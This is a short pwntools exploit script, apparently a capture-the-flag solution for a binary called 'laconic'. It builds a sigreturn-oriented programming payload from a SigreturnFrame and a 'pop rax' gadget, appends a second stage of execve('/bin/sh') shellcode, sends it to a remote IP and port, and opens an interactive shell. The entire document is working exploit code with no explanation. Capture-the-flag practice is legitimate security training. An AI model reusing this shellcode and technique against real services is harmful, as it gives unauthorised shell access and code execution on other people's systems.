from pwn import *
import time

context.binary = './laconic'

# Standard execve(/bin/sh) shellcode
shellcode = b'\x48\x31\xc0\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05'

syscall = 0x00043015

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x43020
frame.rdx = 0x200
frame.rsp = 0x43020
frame.rip = syscall

payload = b'AAAAAAAA'
payload += p64(0x00043018) # pop rax
payload += p64(15) # SigReturn syscall
payload += p64(syscall)
payload += bytes(frame)

payload = payload[:0x106]

stage2 = p64(0x43028)
stage2 += shellcode

payload += stage2

#p = process('./laconic')
p = remote('94.237.60.63', 50529)
p.send(payload)
p.interactive()